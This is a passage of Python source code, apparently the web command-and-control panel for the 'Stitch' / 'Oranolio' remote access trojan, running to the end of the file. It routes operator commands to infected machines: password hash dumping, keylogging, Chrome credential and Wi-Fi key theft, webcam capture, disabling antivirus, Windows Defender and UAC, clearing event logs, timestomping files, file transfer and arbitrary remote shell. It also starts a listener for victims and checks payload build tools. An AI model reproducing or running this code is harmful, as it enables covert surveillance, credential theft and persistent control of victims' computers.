                        input_queue.append('y')
            except Exception as e:
                return output_header + f"❌ Parameter validation failed: {str(e)}"
        
        # Greenlet-safe input mocking using coroutine-local storage
        execution_local.input_queue = input_queue
        execution_local.input_index = 0
        
        original_input = builtins.input
        
        def mock_input(prompt=""):
            """Greenlet-local input mock that won't interfere with other requests"""
            if not hasattr(execution_local, 'input_queue'):
                return ""  # Safety fallback
            if execution_local.input_index < len(execution_local.input_queue):
                value = execution_local.input_queue[execution_local.input_index]
                execution_local.input_index += 1
                return value
            else:
                return ""  # Return empty instead of blocking
        
        original_timeout = None
        try:
            pass
            # Set socket timeout to prevent indefinite hangs
            original_timeout = socket_conn.gettimeout()
            socket_conn.settimeout(30.0)  # 30 second timeout
            
            # Apply monkey-patch for input() if we have parameters
            # CRITICAL: Must restore in finally block to prevent pollution
            if input_queue:
                builtins.input = mock_input
            
            # Create stitch_commands_library instance
            stlib = stitch_lib.stitch_commands_library(
                socket_conn,
                target_ip,
                target_port,
                aes_key,
                target_os,
                target_platform,
                target_hostname,
                target_user,
                cli_dwld,
                cli_temp
            )
            
            # Capture output from st_print calls
            output_buffer = io.StringIO()
            
            # Route command to appropriate method
            result = None
            with redirect_stdout(output_buffer):
                if cmd_name == 'sysinfo':
                    stlib.sysinfo()
                elif cmd_name == 'screenshot':
                    stlib.screenshot()
                elif cmd_name == 'hashdump':
                    stlib.hashdump()
                elif cmd_name == 'keylogger':
                    if cmd_args.startswith('start'):
                        stlib.keylogger('start')
                    elif cmd_args.startswith('stop'):
                        stlib.keylogger('stop')
                    elif cmd_args.startswith('dump'):
                        stlib.keylogger('dump')
                    elif cmd_args.startswith('status'):
                        stlib.keylogger('status')
                    else:
                        return output_header + "❌ Keylogger requires: start/stop/dump/status"
                elif cmd_name == 'avscan':
                    stlib.avscan()
                elif cmd_name == 'avkill':
                    stlib.avkill()
                elif cmd_name == 'chromedump':
                    stlib.chromedump()
                elif cmd_name == 'wifikeys':
                    stlib.wifikeys()
                elif cmd_name == 'freeze':
                    stlib.freeze(cmd_args)
                elif cmd_name == 'webcamlist':
                    stlib.webcamlist()
                elif cmd_name == 'webcamsnap':
                    if cmd_args:
                        stlib.webcamsnap(cmd_args)
                    else:
                        return output_header + "❌ Webcamsnap requires device parameter"
                elif cmd_name == 'displayoff':
                    stlib.displayoff()
                elif cmd_name == 'displayon':
                    stlib.displayon()
                elif cmd_name == 'lockscreen':
                    stlib.lockscreen()
                elif cmd_name == 'disableuac':
                    stlib.disableUAC()
                elif cmd_name == 'enableuac':
                    stlib.enableUAC()
                elif cmd_name == 'disablerdp':
                    stlib.disableRDP()
                elif cmd_name == 'enablerdp':
                    stlib.enableRDP()
                elif cmd_name == 'disablewindef':
                    stlib.disableWindef()
                elif cmd_name == 'enablewindef':
                    stlib.enableWindef()
                elif cmd_name == 'environment':
                    stlib.environment()
                elif cmd_name == 'ps':
                    stlib.ps(cmd_args)
                elif cmd_name == 'pwd':
                    stlib.pwd()
                elif cmd_name == 'ls':
                    stlib.ls(cmd_args)
                elif cmd_name == 'location':
                    stlib.location()
                elif cmd_name == 'vmscan':
                    stlib.vmscan()
                elif cmd_name == 'ipconfig' or cmd_name == 'ifconfig':
                    stlib.ifconfig(cmd_args)
                elif cmd_name == 'drives':
                    stlib.drives()
                elif cmd_name == 'lsmod':
                    stlib.lsmod(cmd_args)
                elif cmd_name == 'download':
                    if cmd_args:
                        stlib.download(cmd_args)
                    else:
                        return output_header + "❌ Download requires file path parameter"
                elif cmd_name == 'upload':
                    if cmd_args:
                        stlib.upload(cmd_args)
                    else:
                        return output_header + "❌ Upload requires file path parameter"
                elif cmd_name == 'cat':
                    if cmd_args:
                        stlib.cat(cmd_args)
                    else:
                        return output_header + "❌ Cat requires file path parameter"
                elif cmd_name == 'cd':
                    if cmd_args:
                        stlib.cd(cmd_args)
                    else:
                        return output_header + "❌ CD requires directory parameter"
                elif cmd_name == 'mkdir':
                    if cmd_args:
                        stlib.mkdir(cmd_args)
                    else:
                        return output_header + "❌ Mkdir requires directory parameter"
                elif cmd_name == 'mv':
                    if cmd_args:
                        stlib.mv(cmd_args)
                    else:
                        return output_header + "❌ Mv requires source and destination parameters"
                elif cmd_name == 'rm':
                    if cmd_args:
                        stlib.rm(cmd_args)
                    else:
                        return output_header + "❌ Rm requires file path parameter"
                elif cmd_name == 'shell':
                    if cmd_args:
                        stlib.send(cmd_args)
                        result = stlib.receive()
                    else:
                        return output_header + "❌ Shell requires a command parameter"
                # Interactive commands now supported with parameter queue
                elif cmd_name == 'firewall':
                    if not cmd_args:
                        return output_header + "❌ Firewall requires subcommand: open/close/allow/status"
                    subcommand = cmd_args.split()[0].lower()
                    if subcommand in ['open', 'close', 'allow']:
                        if not input_queue:
                            return output_header + f"❌ Firewall {subcommand} requires parameters. Use inline syntax or web UI parameter form."
                        stlib.firewall(cmd_args)
                    elif subcommand == 'status':
                        pass
                        # Firewall status doesn't require parameters
                        stlib.firewall(cmd_args)
                    else:
                        return output_header + f"❌ Unknown firewall subcommand: {subcommand}"
                elif cmd_name == 'hostsfile':
                    if not cmd_args:
                        return output_header + "❌ Hostsfile requires subcommand: update/remove/show"
                    subcommand = cmd_args.split()[0].lower()
                    if subcommand in ['update', 'remove']:
                        if not input_queue:
                            return output_header + f"❌ Hostsfile {subcommand} requires parameters."
                        stlib.hostsfile(subcommand)
                    elif subcommand == 'show':
                        pass
                        # Hostsfile show doesn't require parameters
                        stlib.hostsfile(subcommand)
                    else:
                        return output_header + f"❌ Unknown hostsfile subcommand: {subcommand}"
                elif cmd_name == 'popup':
                    if not input_queue and not cmd_args:
                        return output_header + "❌ Popup requires a message parameter"
                    stlib.popup()
                elif cmd_name == 'clearev':
                    if not input_queue:
                        return output_header + "❌ Clearev requires confirmation. Use web UI confirmation dialog."
                    stlib.clearev()
                elif cmd_name == 'timestomp':
                    if not cmd_args:
                        return output_header + "❌ Timestomp requires subcommand: a/c/m (accessed/created/modified)"
                    subcommand = cmd_args.split()[0].lower()
                    if subcommand in ['a', 'c', 'm']:
                        if not input_queue:
                            return output_header + f"❌ Timestomp {subcommand} requires file and timestamp parameters"
                        file_arg = cmd_args.split()[1] if len(cmd_args.split()) > 1 else ''
                        if not file_arg:
                            return output_header + "❌ Timestomp requires file path"
                        stlib.timestomp(subcommand, file_arg)
                    else:
                        return output_header + f"❌ Unknown timestomp subcommand: {subcommand}"
                elif cmd_name == 'logintext':
                    if not input_queue and not cmd_args:
                        return output_header + "❌ Logintext requires a text message parameter"
                    stlib.logintext()
                else:
                    pass
                    # For unrecognized commands, send as shell command
                    stlib.send(command)
                    result = stlib.receive()
            
            # Get captured output
            captured = output_buffer.getvalue()
            if captured:
                return output_header + captured
            elif result:
                return output_header + result
            else:
                return output_header + "✅ Command executed (check logs for output)"
                
        except AttributeError as e:
            return output_header + f"❌ Command '{cmd_name}' not supported or requires parameters\n\nError: {str(e)}"
        except socket.timeout:
            return output_header + "⚠️ Command timed out after 30 seconds.\n\nThe target may be slow, or the command is still executing."
        except socket.error as e:
            return output_header + f"❌ Connection error: {str(e)}\n\nTarget may have disconnected."
        except Exception as e:
            import traceback
            return output_header + f"❌ Execution error: {str(e)}\n\nType: {type(e).__name__}\n\nTraceback: {traceback.format_exc()[-500:]}"
        finally:
            pass
            # CRITICAL: Always restore original input() to prevent global state pollution
            builtins.input = original_input
            # Restore socket timeout
            try:
                if original_timeout is not None:
                    socket_conn.settimeout(original_timeout)
            except Exception:
                pass  # Socket may be closed
        
    except Exception as e:
        return f"❌ Error setting up command execution: {str(e)}"

def get_connection_aes_key(target_ip):
    """Get AES key bytes for an active connection from handshake context"""
    ctx = connection_context.get(target_ip)
    if ctx:
        return ctx.get('aes_key')
    return
def get_sessions_output():
    """Get active sessions output"""
    server = get_stitch_server()
    
    if not server.listen_port:
        return "⚠️  Server is not listening on any port.\n\nUse Terminal to start: python3 main.py"
    
    output = f"🌐 Server Status: Listening on port {server.listen_port}\n\n"
    output += f"📊 Active Connections: {len(server.inf_sock)}\n\n"
    
    if server.inf_sock:
        import configparser
        config = configparser.ConfigParser()
        config.read(hist_ini)
        
        for ip in server.inf_sock.keys():
            output += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            output += f"🎯 Target: {ip}\n"
            
            if ip in config.sections():
                output += f"💻 OS: {config.get(ip, 'os') if config.has_option(ip, 'os') else 'Unknown'}\n"
                output += f"👤 User: {config.get(ip, 'user') if config.has_option(ip, 'user') else 'Unknown'}\n"
                output += f"🏠 Hostname: {config.get(ip, 'hostname') if config.has_option(ip, 'hostname') else ip}\n"
            else:
                output += "⏳ Connection details pending...\n"
            
            output += f"✅ Status: ONLINE\n\n"
    else:
        output += "ℹ️  No active connections.\n\n"
        output += "Waiting for incoming connections on port " + str(server.listen_port) + "...\n"
    
    return output

def get_history_output():
    """Get connection history output"""
    try:
        import configparser
        config = configparser.ConfigParser()
        config.read(hist_ini)
        
        output = "📜 Connection History\n\n"
        
        if config.sections():
            for target in config.sections():
                output += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                output += f"🎯 {target}\n"
                output += f"💻 OS: {config.get(target, 'os') if config.has_option(target, 'os') else 'Unknown'}\n"
                output += f"👤 User: {config.get(target, 'user') if config.has_option(target, 'user') else 'Unknown'}\n"
                output += f"🏠 Hostname: {config.get(target, 'hostname') if config.has_option(target, 'hostname') else target}\n"
                output += f"🔌 Port: {config.get(target, 'port') if config.has_option(target, 'port') else '4040'}\n\n"
        else:
            output += "ℹ️  No connection history found.\n"
        
        return output
    except Exception as e:
        return f"❌ Error reading history: {str(e)}"

def show_aes_keys():
    """Show AES keys"""
    try:
        import configparser
        aes_lib = configparser.ConfigParser()
        aes_lib.read(st_aes_lib)
        
        output = "🔑 AES Encryption Keys\n\n"
        
        if aes_lib.sections():
            for key_id in aes_lib.sections():
                output += f"  • {key_id}\n"
        else:
            output += "ℹ️  No AES keys configured.\n"
        
        return output
    except Exception as e:
        return f"❌ Error reading keys: {str(e)}"

# ============================================================================
# Additional API Routes
# ============================================================================
@app.route('/api/debug/logs')
@login_required
def get_debug_logs():
    limit = int(request.args.get('limit', DEFAULT_LOG_FETCH_LIMIT))
    metrics_collector.increment_counter('api_requests')
    return jsonify(debug_logs[-limit:])

@app.route('/api/command/history')
@login_required
def get_command_history():
    limit = int(request.args.get('limit', DEFAULT_HISTORY_FETCH_LIMIT))
    metrics_collector.increment_counter('api_requests')
    return jsonify(command_history[-limit:])

@app.route('/api/files/downloads')
@login_required
def list_downloads():
    try:
        metrics_collector.increment_counter('api_requests')
        downloads = []
        if os.path.exists(downloads_path):
            for root, dirs, files in os.walk(downloads_path):
                for filename in files:
                    filepath = os.path.join(root, filename)
                    rel_path = os.path.relpath(filepath, downloads_path)
                    stat = os.stat(filepath)
                    downloads.append({
                        'name': filename,
                        'path': rel_path,
                        'size': stat.st_size,
                        'modified': datetime.fromtimestamp(stat.st_mtime).isoformat()
                    })
        return jsonify(sorted(downloads, key=lambda x: x['modified'], reverse=True))
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/files/download/<path:filename>')
@login_required
def download_file(filename):
    try:
        metrics_collector.increment_counter('api_requests')
        filepath = os.path.join(downloads_path, filename)
        
        # Prevent directory traversal (including symlink attacks)
        real_downloads = os.path.realpath(downloads_path)
        real_filepath = os.path.realpath(filepath)
        if not real_filepath.startswith(real_downloads + os.sep):
            log_debug(f"Directory traversal attempt blocked: {filename}", "WARNING", "Security")
            return jsonify({'error': 'Invalid file path'}), 403
        
        if os.path.exists(filepath) and os.path.isfile(filepath):
            log_debug(f"Downloading file: {filename}", "INFO", "Files")
            return send_file(filepath, as_attachment=True)
        return jsonify({'error': 'File not found'}), 404
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================================================
# WebSocket Events
# ============================================================================
@socketio.on('connect')
def handle_connect():
    if 'logged_in' not in session:
        return False
    # request.sid is available in SocketIO context
    log_debug(f"WebSocket connected: {request.sid}", "INFO", "WebSocket")
    emit('connection_status', {'status': 'connected'})
    
    # Send current targets immediately
    try:
        targets = sync_stitch_targets()
        emit('targets_update', {
            'targets': targets,
            'count': len(targets),
            'timestamp': datetime.now().isoformat()
        })
    except Exception as e:
        log_debug(f"Error sending initial targets: {str(e)}", "ERROR", "WebSocket")

@socketio.on('disconnect')
def handle_disconnect():
    log_debug(f"WebSocket disconnected: {request.sid}", "INFO", "WebSocket")
    # Prune any stale contexts opportunistically
    try:
        server = get_stitch_server()
        active = set(server.inf_sock.keys())
        stale = [ip for ip in list(connection_context.keys()) if ip not in active]
        for ip in stale:
            connection_context.pop(ip, None)
    except Exception:
        pass

@socketio.on('ping')
def handle_ping():
    emit('pong', {'timestamp': datetime.now().isoformat()})

# ============================================================================
# Background Tasks
# ============================================================================
def monitor_connections():
    """Monitor and broadcast connection changes"""
    # TODO: Review - infinite loop may need exit condition
    while True:
        try:
            server = get_stitch_server()
            active_count = len(server.inf_sock)
            
            # Synchronize targets and broadcast to UI
            targets = sync_stitch_targets()
            socketio.emit('targets_update', {
                'targets': targets,
                'count': len(targets),
                'timestamp': datetime.now().isoformat()
            })
            
            # Clean up connection_context entries for dropped connections
            active_ips = set(server.inf_sock.keys())
            for ip in list(connection_context.keys()):
                if ip not in active_ips:
                    connection_context.pop(ip, None)
            socketio.emit('connection_update', {
                'active_connections': active_count,
                'timestamp': datetime.now().isoformat()
            }, namespace='/')
        except Exception:
            pass
        time.sleep(SERVER_RETRY_DELAY_SECONDS)

def start_stitch_server():
    """Start the Stitch server"""
    log_debug("Initializing Stitch RAT server", "INFO", "Server")
    try:
        server = get_stitch_server()
        # Start listening on port 4040
        server.do_listen('4040')
        log_debug("Stitch server listening on port 4040", "INFO", "Server")
    except Exception as e:
        log_debug(f"Stitch server error: {str(e)}", "ERROR", "Server")

# ============================================================================
# Main
# ============================================================================
if __name__ == '__main__':
    pass
    # print("\n" + "="*75)
    # print("🔐 Oranolio RAT - Secure Web Interface")
    # print("="*75 + "\n")
    
    # Ensure credentials are loaded (may already be loaded at module level)
    try:
        ensure_credentials_loaded()
        if not USERS:
            raise RuntimeError("No users loaded - credentials initialization failed")
        log_debug("✓ Credentials verified for web interface startup", "INFO", "Security")
    except RuntimeError as e:
        pass
        # print(str(e))
        sys.exit(1)
    
    log_debug("Starting Stitch Web Interface (Real Integration)", "INFO", "System")
    
    # Configure SSL/HTTPS
    ssl_cert, ssl_key = get_ssl_context()
    if ssl_cert and ssl_key:
        ssl_context = (ssl_cert, ssl_key)
        protocol = "https"
        log_debug("HTTPS enabled - encrypted communication active", "INFO", "Security")
    else:
        ssl_context = None
        protocol = "http"
        if os.getenv('STITCH_ENABLE_HTTPS', 'false').lower() in ('true', '1', 'yes'):
            pass
            # print("⚠️  WARNING: HTTPS requested but SSL setup failed - falling back to HTTP")
            log_debug("HTTPS requested but failed - using HTTP", "WARNING", "Security")
        else:
            log_debug("HTTP mode - credentials transmitted in clear text!", "WARNING", "Security")
    
    # Get configured port from config system
    port = config.get('c2.primary_port', int(os.getenv('STITCH_WEB_PORT', '5000')))
    
    # Build tool health check
    def check_build_tools():
        """Check if payload build tools are installed"""
        tools_status = {
            'pyinstaller': False,
            'makeself': False,
            'nsis': False
        }
        try:
            import shutil as _shutil
            tools_status['pyinstaller'] = _shutil.which('pyinstaller') is not None
        except Exception:
            pass
        try:
            from Application.Stitch_Vars.globals import tools_path
            makeself_path = os.path.join(tools_path, 'makeself', 'makeself.sh')
            tools_status['makeself'] = os.path.exists(makeself_path)
        except Exception:
            pass
        tools_status['nsis'] = os.path.exists("C:\\Program Files (x86)\\NSIS\\makensis.exe")
        # print("=" * 75)
        # print("Payload Build Tools Status:")
        # print(f"  PyInstaller: {'✓ Installed' if tools_status['pyinstaller'] else '✗ Missing (install: pip install pyinstaller)'}")
        # print(f"  Makeself: {'✓ Available' if tools_status['makeself'] else '✗ Missing'}")
        # print(f"  NSIS: {'✓ Installed' if tools_status['nsis'] else '✗ Not available (Windows only)'}")
        if not tools_status['pyinstaller']:
            pass
            # print("⚠️  WARNING: PyInstaller not installed - payload generation will fail")
            # print("   Install with: pip install pyinstaller")
        # print("=" * 75)
        return tools_status

    build_tools_status = check_build_tools()

    # Start background threads only when running as main
    if __name__ == '__main__':
        pass
        # Start Stitch server in background
        stitch_thread = threading.Thread(target=start_stitch_server, daemon=True)
        stitch_thread.start()
        
        # Start connection monitor
        monitor_thread = threading.Thread(target=monitor_connections, daemon=True)
        monitor_thread.start()
    
    # Configure debug mode - default to False for security
    debug_mode = os.getenv('STITCH_DEBUG', 'false').lower() in ('true', '1', 'yes')
    
    # print(f"\n🌐 Web interface: {protocol}://0.0.0.0:{port}")
    if ssl_context:
        pass
        # print(f"🔒 HTTPS: Enabled (encrypted communication)")
    else:
        pass
        # print(f"⚠️  HTTP: No encryption - credentials sent in clear text!")
        # print(f"   For production, enable HTTPS: export STITCH_ENABLE_HTTPS=true")
    
    if debug_mode:
        pass
        # print("\n" + "="*75)
        # print("⚠️  WARNING: DEBUG MODE ENABLED")
        # print("="*75)
        # print("Debug mode is DANGEROUS in production!")
        # print("  - Exposes sensitive stack traces")
        # print("  - Allows arbitrary code execution via Werkzeug debugger")
        # print("  - Leaks internal application structure")
        # print("  - Performance overhead")
        # print("\nNEVER use debug mode in production!")
        # print("Set STITCH_DEBUG=false or remove the variable")
        # print("="*75 + "\n")
        log_debug("DEBUG MODE ENABLED - NOT SAFE FOR PRODUCTION", "WARNING", "Security")
    else:
        pass
        # print(f"✓ Debug mode: Disabled (production-safe)")
        log_debug("Debug mode disabled - production configuration", "INFO", "Security")
    
    # print()  # Empty line for readability
    
    # Start web server with or without SSL
    if ssl_context:
        socketio.run(
            app,
            host='0.0.0.0',
            port=port,
            debug=debug_mode,
            use_reloader=False,
            log_output=True,
            ssl_context=ssl_context
        )
    else:
        socketio.run(
            app,
            host='0.0.0.0',
            port=port,
            debug=debug_mode,
            use_reloader=False,
            log_output=True
        )
